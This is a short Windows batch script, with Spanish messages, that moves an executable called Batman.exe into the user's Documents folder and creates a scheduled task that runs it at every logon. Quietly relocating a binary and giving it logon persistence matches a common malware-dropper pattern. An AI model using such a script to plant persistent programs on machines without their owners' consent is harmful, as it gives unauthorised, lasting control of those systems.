@echo off

set archivo=Batman.exe

set origen="%~dp0%archivo%"

set destino="%USERPROFILE%\Documents\%archivo%"

move /Y %origen% %destino%
echo Archivo movido a Documentos.

schtasks /create /sc onlogon /tn "Batman" /tr %destino% /f
echo Tarea programada creada para ejecutarse al iniciar sesión.
